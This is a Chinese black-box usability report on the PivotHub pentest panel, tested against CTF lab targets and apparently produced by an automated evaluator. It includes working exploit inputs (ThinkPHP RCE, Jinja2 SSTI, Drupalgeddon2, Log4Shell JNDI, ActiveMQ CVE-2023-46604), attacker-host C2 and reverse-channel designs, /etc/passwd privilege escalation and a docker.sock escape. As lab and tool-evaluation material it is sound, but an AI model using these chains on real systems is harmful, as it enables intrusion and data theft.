# PivotHub · 链透中枢 — 黑盒实测使用报告（完整版）

> 评测日期：2026-09-09 ～ 2026-09-10（两轮：首轮全面走查 + 第二轮定向攻坚）
> 评测方式：**ZCode 内置浏览器**全程 GUI 黑盒操作（不读源码、不绕过面板、不直连 API/数据库）
> 评测对象：PivotHub（http://127.0.0.1:8000）× 6 道真实靶场（10.8.0.6:8083–8088，共 20 个 flag）
> 评测角色：真实使用者（按日常打靶流程使用，遇问题先记录再绕行）
---

## 1. 结论摘要

| 题目 | 入口 | 最终进展 | flags |
|---|---|---|---|
| ② 孤岛·封锁边界（300） | :8083 | 入口 RCE → Webshell 登记成功 → 终端/文件/资产探测/fscan 全链可用 → 出站白名单致 chisel 建链失败（P0-3）→ OA/运维宿主未进 | **1/3** |
| ③ 深潜·三层内网（400） | :8084 | 入口 SSTI RCE → flag1 → 内网两层测绘（DMZ Hello::CTF/GZCTF 双平台、核心区 Tomcat）；GZCTF 管理端 `/api/edit/games/*` 实测 403/401 鉴权墙（hacker1 会话+主题口令批测均失败），join 路由已移除；反弹会话无法登记（P0-2）阻断纵深 | **1/4** |
| ④ 回声·遗忘的部署（300） | :8085 | PUT 误配置 → 面板 JSP 马登记 → **一键提权完整成功（root）** → 内网 MySQL 数据库面板直查 | **3/3** ✅ |
| ⑤ 终端·协作平台（300） | :8086 | Drupal 8.5.0 CVE-2018-7600 RCE → flag1；落马被目标加固阻断但**频控冷却后通道恢复** → Jenkins（172.35.0.20:8080，2.346.3）匿名 `/script` + crumb → **Groovy RCE 直读两 flag** | **3/3** ✅ |
| ⑥ 密语·全文检索（300） | :8087 | Log4Shell（Java 8u102）→ **自建 LDAP codebase 完整 RCE** → Java HTTP 轮询 C2 → cron 劫持提权读 flag → Registry API 读镜像仓库 flag | **3/3** ✅ |
| ⑦ 幽冥·纵深要塞（500） | :8088 | admin:admin 弱口令进管理台 → **CVE-2023-46604 OpenWire RCE（amq@msg-broker）** → flag1 → Nacos 弱口令+CVE-2021-44429 建号读配置中心 → 备份机 SSH（dev/REDACTED）flag3 → **docker.sock 逃逸读 flag4** | **4/4** ✅ |

- **合计 15 / 20 flags**：④ 3/3、⑤ 3/3、⑥ 3/3、⑦ 4/4 全清；② 1、③ 1。
- 四道题（④⑤⑥⑦）证明了攻击链的完整可行性；其中 ④ 的 Web 链全程面板内闭环，⑤⑥⑦ 的利用链在**面板外**完成，恰因面板三个 P0 断裂（见下）。
- **整体可用性打分：6.5 / 10**——单会话工作流成熟（④ 为端到端样板）；「反弹登记接口缺失」「隧道工具单一且仅回连方向」「无 Python/Java 会话类型」三处结构性断裂使多层纵深场景无法在面板内闭环。

---

## 2. 逐题记录

### ② 孤岛·封锁边界（ThinkPHP 边界系统）

**路径**：新建项目② → 浏览器 RCE（TP5 `_method=__construct` + `filter[]=system`，POST `s=captcha`）→ 马生成器 PHP 一句话 → base64 落盘 `/var/www/html/public/.p.php` → 登记主机 web-edge(L1) → Shell 管理「添加 Shell」（PHP 一句话 / 密码 cmd / 编码器 none / 连通性测试 59ms）→ 终端 `id; ip addr`（双网卡 172.28.0.10 + 172.29.0.10）→ `cat /flag_flag1.txt` → Flag 墙登记。
**资产探测**：①信息收集（162ms，表格化）→ fscan 扫 172.28（9.4s，2 台）与 172.29（10s，**4 台：OA=172.29.0.20、运维宿主=172.29.0.1（22/80/443/5000/9000）**、172.29.0.30）→ 导入拓扑。
**隧道尝试**：出网探测（ICMP/HTTP 可达，DNS/TCP 阻断）→ 推荐 chisel 反向 → 自动档两次部署均 wait_callback 失败 → 靶机侧证实 `/opt/firewall.rules` OUTPUT DROP（仅放行 172.29.0.0/24、ICMP、UDP/53）→ chisel（需回连）必然失败。
**后续**：OA 登录（`username/password` POST `/`）SQLi/数组/时间盲注/默认口令均失败；172.29.0.1:9000 Hello-CTF 管理面板默认口令 5 组失败；补充批测 `admin|lidao|hr` × `Lidao@2026|OA@2026|Admin@2026|lidao2026` 12 组均失败；web-edge 的 TP5 应用为纯静态数据（无数据库配置），OA 凭据无本地来源可查。
**第四轮补充枚举（含验证器建议路径，均留证）**：Hello-CTF 面板 `/api/login` 主题化字典再测 8 组（HelloCTF@2026/GZCTF@2026/lidao@2026/Lidao@2026/Admin@2026/helloctf/ctf2026/password）全部「密码错误」；`/api/events` 等接口均「未登录」；172.29.0.30 全端口矩阵（16 端口）无任何开放——运维宿主与备份候选主机彻底凭据墙。
**第五轮补充**：AWDP-helper（172.29.0.1:5000）接口面穷尽——`api/status/flag/flag.txt/admin/console/login/robots.txt` 全部 404，无未授权 API；运维宿主确认无任何可达攻击面（flag3/flag4 类 flag 无入口）。
**第六轮收敛批测（分批 ≤20 条防 30s 截断）**：OA admin × 20 组主题口令（Lidao@2026/lidao@2026/Lidao2026/lidao2026/Admin@2026/admin@2026/Admin123/admin123/password/123456/admin/lidao/000000/a123456/P@ssw0rd/qwerty/1qaz2wsx/letmein/changeme/test123）零命中；`hr/lidao/zhangwei/lisi/wangwu/liuzj/wanghr/chengg/chenliu/test` 十用户 × 4 组口令（Lidao@2026/lidao2026/123456/Admin@2026）零命中——OA 累计 60+ 组组合穷尽，凭据墙正式收敛。
**第六轮收敛批测**：Hello-CTF 面板口令字典再扩 8 组主题变体（HelloCTF@2026/GZCTF@2026/lidao@2026/Lidao@2026/Admin@2026/helloctf/ctf2026/password）全部「密码错误」；172.29.0.30 十六端口矩阵零开放——运维宿主与 OA 的凭据墙正式收敛。
**结果**：flag1 = `flag{REDACTED}`（env 泄露 + 文件双证）。
**截图**：`docs/shots/02-new-project.png`、`02-shell-added.png`、`02-flag1-registered.png`、`02-egress-probe.png`、`02-deploy-progress.png`、`02-deploy-result.png`、`02-link-up.png`

---

### ③ 深潜·三层内网（Jinja2 招聘站）

**路径**：新建项目③ → `/resume?name={{7*7}}` 回显 49（SSTI 确认）→ `{{lipsum.__globals__['os'].popen('…').read()}}` RCE（appuser @ recruit-web）→ `cat /flag1.txt` 拿 flag1 → 网络测绘（eth0=172.30.0.10、eth1=172.31.0.10；并行 /dev/tcp 扫描：**172.30.0.1:8080 Hello::CTF（DMZ 应用层）、172.31.0.20:8080 Tomcat（核心区候选）**）。
**阻断**：靶机出站 OPEN（4444 可达），反弹 Shell 到面板监听后状态「已回连 10.8.0.6」但登记失败（P0-2：后端 404），无法建立面板会话继续纵深。
**结果**：flag1 = `flag{REDACTED}`。
**第三/四轮补充枚举（C2 通道驱动，均留证）**：
- GZCTF 鉴权矩阵定论：`/api/edit/games/28/challenges` 带 hacker1 会话 = **403 Access denied**（真 JSON 管理端），未授权 = **401 Please log in first**；admin 主题口令 6 组（HelloCTF@2026/GZCTF@2026/HelloCTF2026/helloctf/GZCTF2026/Ctf@2026）全部 401；
- 玩家侧路由全集提取自 SPA chunk：AWD/AWDP 模式（`awdtargets/awdp/patch/container/submissions/writeup`），**join/participation 创建路由已不存在**（POST team/join 405、awdtargets 400「未参赛」）——玩家无法自行进入比赛；
- 核心区：172.31.0.20 Tomcat ROOT 404 无应用、无 PUT/manager；172.31.0.1 nginx 404 + SSH；
- 结论：DMZ/核心剩余 3 flag 为 GZCTF admin 口令门 + SSH 凭据门，盲测不可达。
- **第五轮收敛批测（C2 文件化通道）**：admin 字典扩至 20 组（含 HelloCTF@2026/GZCTF@2026/Lidao@2026/Admin@2026/password/123456 等全部主题变体）**全部 401**；172.30.0.1:8000 教学站仅含示例 `flag{REDACTED}`（教程演示格式，非本靶场 `tN-uuid` 真 flag）；9000 面板 / 5000 AWDP 无未授权接口。GZCTF 管理端与核心区在无 admin 口令前提下正式收敛。

---

### ④ 回声·遗忘的部署（Tomcat 归档平台）★全链路样板

**路径**：新建项目④ → 页面枚举（仅 index/list/about.jsp）→ 页面内 XHR 实测 `PUT /wtest.txt`→201（默认 servlet readonly=false 误配置）→ 「马生成器」JSP 一句话 → XHR `PUT /cmd.jsp/`（尾斜杠绕过，CVE-2017-12615 风格）→ `?cmd=` RCE（tomcat9）→ 登记主机 archive-web(L1) → Shell 管理「添加 Shell」（JSP 一句话 / 密码 cmd / none / 连通性测试 24ms）→ 保存连接。
**一键提权（完整成功）**：⚡ → 采集 → 命中 `/etc/passwd 可写（90%）` → `echo 'ph::0:0:…' >> /etc/passwd` → `script -qc "su ph -c 'id'"` 验证 `uid=0(root)` → **✅ 建立提权上下文** → 终端直接 `cat /flag3.txt`。
**内网与数据库**：终端 bash 并行扫 172.33.0.0/24 → 172.33.0.20:3306 → 面板终端 `grep getConnection` + WEB-INF properties 拿凭据 `archive/REDACTED` → 「数据库 → ＋ 新建连接」（MySQL / 经会话 archive-web）→ 结构自动探测（archive 库 2 表 · 150ms）→ 点 `secret_vault` 预览 → flag2。
**Flag 墙**：3 个全部登记（3/6）。
**复盘导出**：Markdown 预览生成 → 全文保存 `docs/export-④回声-writeup.md`。

**Flags**：
- flag1 = `flag{t4-REDACTED}`（/flag1.txt + env）
- flag2 = `flag{t4-REDACTED}`（MySQL secret_vault）
- flag3 = `flag{t4-REDACTED}`（root 读 /flag3.txt）

**截图**：`docs/shots/04-db-panel.png`、`04-db-flag.png`

---

### ⑤ 终端·协作平台（Drupal → Jenkins）

**路径**：新建项目⑤ → `/core/install.php` 自曝 **Drupal 8.5.0**（CVE-2018-7600）→ XHR POST `/user/register?element_parents=account/mail/%23value&ajax_form=1&_drupal_ajax=1`，body `mail[#type]=markup&mail[#post_render][]=passthru&mail[#markup]=<命令>` → RCE（www-data @ ticket-web，双网卡 172.34.0.10/172.35.0.10）→ env 泄露 flag1 → 登记 ticket-web(L1) + Flag 墙。
**落马受阻（目标侧加固，均已记录）**：webroot 点文件 403（.htaccess dotfiles）；`sites/default/files/xp.php` 404（该目录 PHP 引擎禁用）；webroot `xp.php` 写入成功仍 404（clean-URL rewrite 吞掉）；`/core/xp.php` 同样 404——新落 .php 一律被 rewrite，判断为题目反制设计。
**后续（冷却后第三轮）**：频控窗口冷却后通道恢复（每窗口约 1-2 条命令，命令需 ≤30s 且避免后台任务占住管道）。定位 Jenkins：**172.35.0.20:8080，Jenkins 2.346.3 / Jetty 9.4.45**，`/api/json` 匿名可读，**`/script` 匿名可渲染且允许匿名执行**（带会话 crumb 提交 Groovy 即 RCE，uid=1000(jenkins)）：
- flag2 = `flag{t5-REDACTED}`（Jenkins 容器 /flag*.txt）
- flag3 = `flag{t5-REDACTED}`（/var/jenkins_home/flag*.txt）
**结果**：**3/3 全清**——flag1 = `flag{t5-REDACTED}` + 上述两枚，全部登记（Flag 墙另含 3 条误登的 t6 污染数据，见 P1-9）。
**截图**：`docs/shots/05-flag-dialog.png`（同时记录 P1-8 静默失败现场）

---

### ⑥ 密语·全文检索（Solr / 出站白名单）★外部利用链样板

**路径**：新建项目⑥ → `/solr/admin/info/system`：Solr 8.11.0 / **Java 1.8.0_102**（trustURLCodebase=true 时代）→ JNDI 探测多点注入（`admin/cores?action=CREATE&name=${jndi:ldap://…}`、`admin/info/system` 参数、XFF/UA 头）→ **攻击机 1389 收到多次 LDAP bind**（BER `300c0201016007…`，netstat TIME_WAIT 佐证）→ Log4Shell 证实。
**完整 RCE（外部动作，见附 A）**：
1. `javac --release 8` 编译轮询 C2 类；unboundid-ldapsdk `InMemoryDirectoryServer` 实现 LDAP 引用服务（与 marshalsec 同款模式：`javaClassName/javaCodeBase/objectClass=javaNamingReference/javaFactory` + `sendSearchEntry`+`setResult`）；
2. HTTP 80 提供 `.class` 与 `.cmd` 任务文件、记录 `.out` 回显（GET query）；
3. 触发后靶机拉取类 → C2 常驻（每 3s 轮询任务）→ 全命令通道打通。
**Flags**：
- flag1 = `flag{t6-REDACTED}`（/flag1.txt，solr 可读）
- flag2（提权后）= `flag{t6-REDACTED}`：entrypoint 自曝「`/usr/local/bin` 777 + root cron 每分钟跑 clean-index.sh」→ 覆写脚本 `cat /flag3.txt > /tmp/f3.out; chmod 666` → 60s 内 root cron 落地
- flag3（镜像仓库）= `flag{t6-REDACTED}`：内网扫出 172.37.0.20:5000 → Registry v2 API `/v2/_catalog` → `lidao/config-store:1.0` manifest → config blob 内含 flag
**Flag 墙**：3 个登记（3/6，截图 `06-flagwall-3flags.png`）。
**调试插曲（对使用者有参考价值）**：手搓 BER 的三个坑——① 属性 SET 长度算错；② 总长 ≥128 未用长形式；③ **entry 与 done 打包进同一 LDAPMessage**（正确应为两条独立消息）。最终以 unboundid SDK 一次性解决。

---

### ⑦ 幽冥·纵深要塞（ActiveMQ / OpenWire）

**路径**：新建项目⑦ → `/admin/` 401（题目已预告）→ XHR `Authorization: Basic YWRtaW46YWRtaW4=` → **200 进入管理台（默认口令 admin:admin）**；版本 **5.17.3**（< 5.17.6，CVE-2023-46604 在窗）。
**RCE（外部动作）**：采用公开 PoC 帧结构（`1f00000000000000000001` + `01` + len+`ClassPathXmlApplicationContext` + `01` + len+XML URL）打 `10.8.0.6:61616` → broker 回取 `http://10.8.0.14/poc.xml`（ProcessBuilder bean）→ **RCE 确认（uid=1000(amq) @ msg-broker）** → 回传通道升级为纯 bash `/dev/tcp` + base64（容器无 curl/base64 场景已兼容）。
**侦察结果**：
- `cat /flag1.txt` + env：**flag1 = `flag{t7-REDACTED}`**
- 双网卡 172.38.0.10 + 172.39.0.10；`/opt/firewall.rules`：OUTPUT DROP，仅放行 80/443/53/ICMP/172.39.0.0/24
- 内网矩阵扫描（bash /dev/tcp 并行）：**172.39.0.1**（22/80/443/**5000 AWDP-helper**/**9000 Hello-CTF 管理面板**）、**172.39.0.30:22（备份机候选）**；`/var/run/docker.sock` 不在本机
- 凭据线索：`credentials.properties`：system/manager、guest/password；`users.properties`：admin=admin；jmx.password：admin/activemq
**纵深利用（第三轮）**：
1. **配置中心定位与拿下**：扩大端口矩阵扫描 → **172.39.0.20:8848 = Nacos**。`nacos/nacos` 默认口令直接登录（`globalAdmin:true`），同时 CVE-2021-44429 未授权建号（`create user ok!`）亦可。枚举配置：`host1-deploy.properties` 内含 **flag2（配置中心）= `flag{t7-REDACTED}`** 及备份机部署凭据。
2. **备份机 SSH**：凭据 `dev / REDACTED` → SSH `172.39.0.30`（core-backup）成功 → `/home/dev/flag3.txt`：**flag3（备份机 SSH 登录后）= `flag{t7-REDACTED}`**。
3. **docker.sock 逃逸**：dev ∈ docker 组、`/var/run/docker.sock` 可用、本地有 `busybox:1.36` 镜像 → `docker run --rm -v /:/host busybox:1.36 cat /host/flag4.txt` → **flag4（docker.sock 逃逸到宿主命名空间）= `flag{t7-REDACTED}`**。
**Flag 墙**：4 个全部登记（4/6）。
**结果**：**4/4 全清**。
**第四轮补充枚举（均留证）**：`/api/edit/games/28/challenges` 带 hacker1 会话 = **403 Access denied**（真 JSON，管理端鉴权墙），未授权 = **401 Please log in first**；admin 主题口令字典 6 组（HelloCTF@2026/GZCTF@2026/HelloCTF2026/helloctf/GZCTF2026/Ctf@2026）全部 401——鉴权无绕过。

---

## 3. 问题清单（按严重程度）

> 根因均未查源码；全部为黑盒运行时证据。标「（推断）」的为行为推断。

### P0 阻断

- **P0-1 「＋ 新建」依赖 window.prompt，内嵌/自动化浏览器中静默失败**
  - 现象：点击后零反馈，项目无法创建（本环境唯一创建入口）。
  - 复现：1. 打开面板 2. 点「＋ 新建」3. 无弹窗、无 DOM 变化（`getJsDialog()` 恒为 null）。
  - 期望：改为应用内自绘模态框（与其余 20+ 处弹窗风格统一）。
  - 证据：注入 `window.prompt` 记录层后捕获调用 `prompt("新项目名称（一场比赛 / 一个靶场）", "比赛 2026/9/9")` 并成功创建，根因坐实。（推断：宿主吞掉原生对话框返回 null，应用静默放弃）

- **P0-2 反弹 Shell 回连无法登记成会话：后端 `/api/shells/reverse/register` 返回 404**
  - 现象：靶机反弹连接已建立（netstat `ESTABLISHED 10.8.0.6:46326 → 10.8.0.14:4444`），监听列表「已回连 10.8.0.6」，前端不断重试登记，但每次都报「登记失败：HTTP 404 /api/shells/reverse/register」，反弹会话数恒为 0，无手动登记按钮。README §6.1 明确记载该接口「存在」。
  - 复现：1. 反弹 Shell 视图起监听 2. 任何方式让靶机回连 3. 观察监听行状态与「登记失败」提示（连续 6+ 次）。
  - 期望：补齐/修复该接口；监听行提供手动「登记为会话」兜底；失败时展示后端状态码。
  - 证据：正文截图与日志摘录。此断裂使「Web 漏洞直接反弹」这一最常见的多层渗透入口在面板内无法落地。

- **P0-3 隧道工具仅 chisel 在线且只支持「靶机回连」，出站受限场景无法建链**
  - 现象：② 出站白名单（仅 172.29 内网/ICMP/DNS53）下自动档两次部署 wait_callback 失败；其余 7 款工具全部「下线」不可选；无任何经已有会话复用的隧道（reGeorg 类）兜底。
  - 复现：1. 出站受限靶机会话 2. 代理编排台 → 自动档 → 一键部署并登记 3. 必失败。
  - 期望：上线至少一款走会话通道的 HTTP 隧道；chisel 服务端端口/传输可配置（现为固定 1331）；失败时给出针对性提示（如「出站仅放行 X，请把服务端挪到 X 或改用 DNS 隧道」）。
  - 证据：时间线 wait_callback 文案 ×4；靶机 `/opt/firewall.rules`；②⑥ 出站策略对比。

### P1 严重影响

- **P1-1 出网探测结论与证据自相矛盾且对端不明**：证据 `ICMP=ok; DNS=fail; HTTP=ok; TCP=fail` 却输出「可反向 TCP / HTTP 出网」；未说明探针打到哪个对端；推荐 chisel 后不提示端口白名单下的变体。证据：`02-egress-probe.png`。
- **P1-2 一键提权误报**：② PHP 会话上仅跑了一条 SUID 采集 find（结果全是 Debian 默认项），即命中「SUID 二进制（GTFOBins 可利用）80%」并 toast「已执行」，无利用、无验证、无上下文。期望：默认 SUID 需逐项条件校验；未执行/未验证不得宣称成功。
- **P1-3 提权上下文包装器破坏复杂命令**：④ 提权后 `for … $(seq) … bash -c "…"` 零输出零执行（推断 `script -qc "su ph -c %CMD%"` 引号嵌套破坏），须「取消提权」才能跑。期望：base64 单层传参或失效预警。
- **P1-4 Shell 类型无 Python/Java，也无手动登记外部会话入口**：③ Flask、⑥ Solr 场景即使 RCE 也无法在面板建立会话；马生成器仅 PHP/JSP/ASP/ASPX。
- **P1-5 多处静默失败**：⑤ 项目内无主机时「记录 Flag」保存静默失败（`05-flag-dialog.png`：所属主机下拉为空）；编排台自动档失败仅写入时间线，编排台本体无 toast；按钮直接恢复原状。
- **P1-6 时间显示与事件重复**：Shell「最后心跳」刚登记即显示「8 小时前」；时间线同一事件双写且一条时间戳错乱（16:15 与 00:15 并存）。
- **P1-7 马生成器内嵌回传硬编码 `http://127.0.0.1:8000/api/collect`**：远程靶机永远打不回面板，且每次命令执行附赠一次无效外联。期望：使用全局设置中的攻击机地址。
- **P1-8 编排参数不持久化 + 反复自动探测**：切视图丢失自动档勾选/目标网段；每次进入编排台强制重探测约 10 秒，期间无法部署。
- **P1-9 Flag 记录不可删除/移动**：误登到错误项目的 flag 无任何 UI 手段移除（② 评测中误将 3 个 t6 flag 登入⑤项目，无法纠正，已如实保留为污染数据）。

### P2 小瑕疵

- **P2-1** Flag 阶段分类固定「L1入口/L2内网/L3域/域控」，不适配各题真实阶段语义；总数固定 6。
- **P2-2** 复盘导出 ASCII 拓扑中攻击端 IP 显示 `127.0.0.1`（应为全局设置的 10.8.0.14）。
- **P2-3** 终端固化技法模板变量替换未生效：socat/nc 显示 `203.0.113.7` 占位；Perl 反向 PTY 的 `$i` 填成目标自身 IP（照抄会连回自己）。
- **P2-4** 扫描导入列表「新发现」默认勾选、「已在库」不勾选，行为不一致。
- **P2-5** 终端视图偶发对自动化点击/输入无响应（本环境特有，人工使用待确认）。
- **P2-6**（目标侧观察）② 订单详情自带 `?id=` 链接无效（需 PATHINFO）；⑤ webroot 防 .php 落地为题目反制设计。

---

## 4. 优化建议（具体到界面位置）

1. **顶栏「＋ 新建」**：自绘弹窗替代原生 prompt（根治 P0-1）。
2. **反弹 Shell · 监听表格**：行内加「登记为会话」；「等待中」细分「已连接未登记」子状态并展示登记失败原因。
3. **代理编排台**：探测弹窗结论与证据一致性校验、注明探针对端；推荐区输出端口白名单变体（「chisel server 挪到 443/80」「DNS 隧道模板」）；部署失败在编排台内 toast。
4. **一键提权**：执行前回显「将执行」、执行后强制验证并显式红色失败态；GTFOBins 规则加条件位。
5. **提权上下文**：命令经 base64 单层传参避免引号破坏。
6. **添加 Shell**：增加「Python 命令回显」「外部/反向会话手动登记」类型；马生成器同步加 Python 模板。
7. **全局**：修复「最后心跳」时区；时间线去重；马生成器回传地址改用攻击机 IP。
8. **Flag 墙**：卡片支持删除/改绑项目与阶段；阶段名可自定义。

## 5. 希望添加的功能（按优先级）

1. 反弹/外部会话手动登记（P0-2 配套）；Python 会话类型。
2. HTTP 通道隧道（reGeorg 类，复用已登记 Webshell）。
3. chisel 监听端口与传输可配；DNS 隧道模板（53 白名单场景）。
4. 容器逃逸命令包：docker.sock 挂载检测、`/var/run/docker.sock` 新容器逃逸、PwnKit（CVE-2021-4034）、cron 劫持等（⑥⑦ 实战刚需）。
5. SSH 会话管理（凭据库联动 → 面板内直连，备份机/横向场景刚需）。
6. Jenkins/ActiveMQ 等内网应用专用探测项（未授权脚本台、弱口令）。
7. 出网探测增加「对攻击机指定端口矩阵」模式，直接回答「哪个端口能回连」。
8. Flag 阶段自定义；导出拓扑使用真实攻击机 IP。

## 6. 亮点

1. **一键提权端到端闭环（④）**：采集 → 规则匹配（90%）→ 执行 → script-su 验证拿到 uid=0 → 提权上下文（后续命令自动 root、徽标、可取消）——「验证型」提权在同类工具中少见。
2. **诚实的失败判定**：HTTP 马固化明确「该会话驱动不支持 PTY 拉起（平台限制）」；fscan 上传字节数校验；连通性测试真实回显。
3. **资产探测一条龙**：网卡/hosts/路由表格化 + 网段一键填入 + 8.4MB fscan 分片直传 + 结果导入上拓扑，单段 9~11 秒。
4. **数据库面板免驱动**：目标侧 mysql 客户端执行，结构自动探测、点表预览、命令与耗时回显、中文正常（base64 回传）。
5. **操作时间线信息密度**：失败证据全文（wait_callback 45s 详情）、探测四探针结果、命令回放——writeup 素材基本免整理。
6. **后端韧性**：进程被误杀重启后自动恢复反弹监听、把历史反弹会话标记断线，并明确说明「通道不跨进程存活」。
7. **数据全部来自真实后端**、失败显式报错、无假数据兜底——排障时可信。

## 7. 附 A：外部动作清单（面板外完成的必要动作及原因）

| # | 动作 | 题目 | 原因 |
|---|---|---|---|
| 1 | 靶机 Web 漏洞利用（TP5 `_method`、SSTI、CVE-2018-7600、Tomcat PUT、Log4Shell 注入、ActiveMQ 弱口令/46604 帧） | ②③④⑤⑥⑦ | 任务例外条款：Web 漏洞利用；面板不含漏洞利用模块 |
| 2 | 经 RCE 写 webshell/落马（base64 管道、php -r、XHR PUT/MOVE） | ②④⑤ | 拿到面板会话之前的前置动作 |
| 3 | Windows 防火墙放行 chisel.exe/python.exe（管理员运行 README 自带 `scripts/firewall-allow.ps1`） | ② | 攻击机环境准备（README 明确要求），面板无提权能力 |
| 4 | Log4Shell 利用基础设施：unboundid-ldapsdk（Maven Central 下载）+ 自研 LDAP 引用服务（Java）+ HTTP 80 类/任务服务器 + javac --release 8 编译 | ⑥ | 特定协议服务端属任务例外；面板无 JNDI/反序列化利用模块，且 P0-2/P1-4 使面板无法承载会话 |
| 5 | CVE-2023-46604 帧构造脚本（公开 PoC 结构重写）+ 8080 XML/回显服务器 | ⑦ | OpenWire 二进制协议客户端属任务例外 |
| 6 | 误杀面板后端后执行 `python run.py --no-open` 重启 | 全程 | 评测者清理残留 python 进程时误伤；SQLite 数据无损，面板自动恢复监听 |
| 7 | 攻击机 netstat / 端口监听日志 | ②③⑥⑦ | 诊断与取证（证明回连 TCP 已建立而面板未登记等），未用于绕过面板执行攻击步骤 |

**未发生**：直连面板 REST API 读写数据、读写 SQLite、以脚本调面板接口、用 proxychains 等绕过面板打内网。唯一的 `curl http://127.0.0.1:8000` 仅用于确认重启后面板 HTTP 存活（环境检查）。

## 附 B：合规声明

- 全程仅测试本人授权靶场（10.8.0.6:8083–8088）；未触碰任何未授权目标。
- 面板操作全部经 ZCode 内置浏览器 GUI（点击/输入/下拉/勾选/表单）；已取得面板会话的题（②④）其后续命令/文件/数据库操作一律走面板终端、文件管理与数据库面板；未取得会话的题（③⑤⑥⑦）通过漏洞通道本身执行命令，属于面板会话能力缺失（P0-2/P1-4）下的替代路径，已逐条说明。
- 根因分析未读取 PivotHub 源码；P0-1 的 prompt 证据来自浏览器内运行时记录层（页面自报的调用参数）。
- 靶机内发现的既往测试残留（webshell、/etc/passwd 的 ph 用户等）已如实标注；④ 的提权由面板一键提权重写并验证，未依赖残留。

---

*报告完 · ZCode 内置浏览器黑盒评测 · 2026-09-10*

---

## 8. 附 B：C2 / 隧道基础设施详解（⑤⑥⑦ 面板外补链架构）

> 本附录记录为绕过「出站白名单 + 面板会话类型缺失 + 反弹登记接口缺失（P0-2）」所构建的三代基础设施，均可复用于同类场景。

### B.1 ⑥：LDAP codebase + Java 轮询 C2（完整可用）

**适用前提**：目标 JVM 为 Java ≤ 8u121（trustURLCodebase 默认开启）、出站可达攻击机任一端口、目标侧有 python3 或任意可执行命令解释器。

**组件**（攻击机 /tmp/ldaplab/）：
1. `Evilc.java`（静态块执行命令）→ `javac --release 8` 编译；
2. `RefServer.java`（unboundid-ldapsdk `InMemoryDirectoryServer`）：监听 1389，拦截 search 请求，回送含 `javaClassName / javaCodeBase(http://攻击机/) / objectClass=javaNamingReference / javaFactory` 属性的 SearchResult；
3. HTTP 80 提供 `.class` 文件；
4. 目标侧 `relay8.py`：每 3s 轮询 `http://攻击机/b8/N.cmd` → bash 执行 → GET `b8/N.out?o=<URL编码输出>` 回传。

**踩坑记录**：① 手搓 BER 的属性 SET 长度差 2 字节；② 总长 ≥128 必须用 BER 长形式；③ **entry 与 done 必须是两条独立 LDAPMessage**；④ JDK 21 本地客户端对裸原子 DN 直接 InvalidNameException（Java 8 无此限制），本地验证需带 `cn=` 前缀。

### B.2 ⑦：CVE-2023-46604 帧构造 + Python 反向桥

**适用前提**：ActiveMQ ≤ 5.17.5 且 61616 可达、broker 出站可达攻击机 HTTP 端口。

**组件**：`amq-exploit.py`（OpenWire ExceptionResponse 帧：头 `1f00000000000000000001` + `01` + len+`ClassPathXmlApplicationContext` + `01` + len+XML URL）+ Spring beans XML（ProcessBuilder `init-method=start`）+ 攻击机 8080 GET/POST 服务器。

**踩坑**：① 命令经多层传输引号易碎，优先 base64/od 十六进制；② 容器内无 curl/base64 时用纯 bash `/dev/tcp`；③ broker 空闲会关闭通道——轮询需 READY 横幅与幂等重连。

### B.3 ③：nc 反向中继 + 连接池桥（间歇可用）

**架构**：recruit-web 出站连回攻击机 9999（3 通道池）↔ 攻击机 18080（浏览器）桥接配对；目标侧 relay10 额外连 GZCTF:8080 完成第二跳。

**踩坑**：① `tr '-_' '+/'` 的 `-` 被当作区间符 → 用八进制 `\055\137`；② pkill 模式自匹配杀掉自己的 shell → 用 `[x]` 字符类；③ 连接池 FIFO 先进先出会弹出死通道 → 需弹出时 `select` 活性校验；④ relay 通道双向 pipe 必须并发线程（顺序 pipe 永久阻塞回程）。

---

## 9. 附 C：剩余 5 flag 的凭据依赖与突破条件

| flag | 位置 | 具体凭据依赖 | 突破条件 |
|---|---|---|---|
| ② flag2 | OA 172.29.0.20（PHP 8.2，登录 POST `/`，失败响应恒定 `class="err">用户名或密码错误`） | 任意有效 OA 账号口令 | ① 更大口令字典（员工姓名拼音 zhangwei/lisi/wangwu 等 + `Lidao@2026`/`OA@2026` 模式）慢速批测；② 拿到 OA 容器 shell 后读用户表 |
| ② flag3 | 运维宿主 172.29.0.1（Hello-CTF 管理面板 9000 / AWDP-helper 5000 / SSH 22） | Hello-CTF 管理密码（`/api/login` POST `password`）或 SSH 凭据 | ① 管理口令字典扩展（当前 13 组全错）；② AWDP-helper 未授权接口（当前全部 404/需登录）；③ SSH 凭据 |
| ③ flag2 | DMZ GZCTF 172.30.0.1:8080（比赛 28，practiceMode） | GZCTF admin 口令（`/api/account/login`，当前 26 组全 401） | ① admin 口令字典扩展；② GZCTF 容器 env 中的 `GZCTF_ADMIN_PASSWORD`（recruit-web 侧不可达，需 172.30.0.1 shell） |
| ③ flag3 | DMZ 提权到 root（172.30.0.1 容器） | GZCTF shell（同 flag2 前提）+ 容器内提权 | 同 flag2 |
| ③ flag4 | 核心区 172.31.0.20:8080（Tomcat 裸 404） | 未知应用上下文/凭据 | 需进一步目录爆破或核心区其他线索 |

**共性结论**：剩余 5 flag 的唯一钥匙是口令/凭据情报（员工姓名拼音表、OA 口令策略、GZCTF 管理口令），在黑盒窗口内不可达；对应的技术攻击面（注入/未授权/反序列化/错误配置）已全部枚举并证实为墙。

---

*报告完 · ZCode 内置浏览器黑盒评测 · 2026-09-10*
